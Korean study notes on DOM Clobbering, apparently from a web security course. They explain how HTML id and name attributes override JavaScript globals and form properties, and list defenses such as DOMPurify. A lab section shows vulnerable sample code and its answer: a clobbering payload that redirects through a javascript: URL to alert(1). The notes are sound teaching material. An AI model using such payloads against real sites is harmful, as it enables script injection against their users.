DOM Clobbering :
    id, name 등 HTML에서 사용되는 식별자 속성을 이용해 자바스크립트에서 접근 가능한 (DOM) 객체들의 속성 및 메소드 등을 변조하는 기법입니다.

    기존 브라우저는 스크립트 작성자의 편의를 위해 DOM 노드(원소 등)에서 자식 노드 등을 직접 접근할 수 있도록 해왔습니다. 
    웹 프로그래밍을 하다 보면 document.getElementById() 를 사용하지 않고도 노드 id를 변수처럼 사용할 수 있음을 발견할 수 있는데,
    Window 전역 객체는 JavaScript Proxy와 유사한 형태로 구현되어 있어 정의되지 않은 속성은 DOM에서 찾게 됩니다.

    이 외에도 form 요소 또한 하위 요소를 name값으로 찾을 수 있도록 되어 있습니다.

    ex) 
        <input id=test />
        <script>test.value = 1234;</script>
        <!-- 
        <input id=test value=1234 /> 
        -->
        
        <form id=form1>
        <input name=firstName value=John />
        <input type=submit />
        </form>
        <script>form1.firstName.value = 'Alice'</script>
        <!--
        <input name=firstName value=Alice />
        -->

    비록 웹 개발자 입장에서는 편리한 기능일 수 있으나, 만약 HTML 마크업이 사용자나 제3자로부터 제공된다면 문제가 발생할 수 있습니다. 
    글로벌 변수 이름공간이나 요소 객체 속성은 미리 정의된 속성(e.g. element.innerHTML, window.open 등)과 충돌할 수 있으며, 
    프로그래머가 예상했던 것과 다른 값이 반환되게 됩니다.

    ex)
        <form>
            <input id=innerHTML />
            <input type=text name=removeChild />
        </form>
        <script>
        console.log(document.forms[0].innerHTML);
        // Element <input id="innerHTML">
        console.log(document.forms[0].removeChild);
        // Element <input type="text" name="removeChild">
        </script>

    만약 웹 응용이 미리 정의되지 않은 전역 변수에 접근한다면 공격자가 입력한 요소로 대체되어 반환될 수 있습니다. 
    또한 form 등 요소에서 속성을 접근할 때 본래 속성값이 아닌 삽입된 객체가 반환되게 됩니다.

    DOM Clobbering을 방어할 수 있는 가장 효과적인 방법은 간접적 메소드 호출 및 접근자를 사용하는 것입니다. (e.g. Function#call)

    예를 들어 HTMLFormElement.prototype.reset.call(elm) , Object.getOwnPropertyDescriptor(Node.prototype, 'textContent').set.call(elm, '')와
    같은 형태를 활용하면 실제 객체에 어떤 속성에 정의되었느냐에 상관없이 본래 속성을 접근할 수 있게 됩니다.
    그러나 사용이 번거로워 잘 사용되지는 않습니다.

    그럼에도 불구하고 third-party 라이브러리(e.g. jQuery)와의 상호 작용에서 취약점이 발생할 가능성이 높은데, 
    id, name 등 식별자 attribute를 제거할 수 있는 DOMPurify와 같은 라이브러리를 사용하는 것이 좋습니다.

실습 :
    샘플 코드는 Dom Clobbering 공격에 취약합니다.
    HTML CODE IS INJECTED HERE에 공격자의 HTML 코드가 인젝션 됩니다.
    DomPurify를 통해 악의적인 스크립트 코드가 실행되지 못하게 하였습니다.
    DomPurify 옵션을 통해 javascript scheme은 허용하였습니다.
    <a href="javascript:alert(1);">alert</a>

    Code :
        <!-- HTML CODE IS INJECTED HERE -->
        <div id="config_status" style="white-space: pre;"></div>
        <script>
        if (window.CONFIG) {
            if (CONFIG.redirectUrl) {
                location.href = CONFIG.redirectUrl
            } else {
                document.write("<h1>redirectUrl is empty</h1>")
            }
        } else {
            document.write("<h1>CONFIG is not defined.</h1>")
        }
        status = "CONFIG: " + (window.CONFIG||"NOT DEFINED")
        status += "\r\n"
        status += "CONFIG.redirectUrl: " + (window.CONFIG?window.CONFIG.redirectUrl||"NOT DEFINED":"NOT DEFINED")
        config_status.textContent = status
        </script>

    답 :
        HTML Code :
            <a id="CONFIG" name="redirectUrl" href="javascript:alert(1)"/><a id="CONFIG" />
        Run 버튼

    --> a.b와 같은 하위 속성을 만들기 위해 HTMLCollections를 이용할 수 있습니다.
    
    <a id="a" name="b"></a>
    <a id="a"></a>
    
    window.a 를 출력시켜보면 b key를 가진 것도 존재하는 것을 볼 수 있습니다.
    HTMLCollection(2) [a#a, a#a, a: a#a, b: a#a]
    
    이를 이용해 공격 코드를 제작해 보면 다음과 같습니다.
    
    <a id="CONFIG" name="redirectUrl" href="javascript:alert(1);"></a>
    <a id="CONFIG"></a>

    참고 : https://intadd.tistory.com/143

    window에 기본적으로 없는 프로퍼티를 가져올 때, 그 프로퍼티 이름을 id 속성값으로 가진 요소가 존재한다면 해당 요소 객체가 반환되게 됩니다.
    그러나 만일 해당하는 요소가 두 개 이상 존재한다면 id가 중복되어 브라우저는 이중에서 어떤 요소를 반환해야 하는지 알 수 없습니다.
    
    이때, Internet Explorer나 Chrome과 같은 브라우저는 중복된 요소들을 모두 포함하는 HTMLCollection 객체를 대신 반환합니다.
    HTMLCollection 객체는 하나 이상의 HTML 요소 등을 모아놓은 객체로, 요소의 name 속성 등을 프로퍼티명으로 사용하여 모음에 속한 요소 객체를 가져올 수 있습니다.

    강의에서 다룬 <a id="a" name="b"></a><a id="a"></a> 코드 예제를 말씀주신 것으로 이해했습니다. 
    코드에서 a를 id로 가지는 태그는 2개인 것을 보실 수 있습니다. 
    앞서 언급한 브라우저 환경을 상정하고 말씀드렸을 때, window.a 속성을 접근하면 앞선 두 태그에 해당하는 요소 객체가 반환됩니다.
    여기에서 b 속성을 접근하면 이중에서 name 이 b 인 요소가 선택됩니다.
    최종적으로 window.a.b 는 첫번째 a 요소, 즉 <a id="a" name="b"></a> 를 선택하게 됩니다.
    마찬가지로 window.CONFIG 예제에도 적용 가능합니다.





























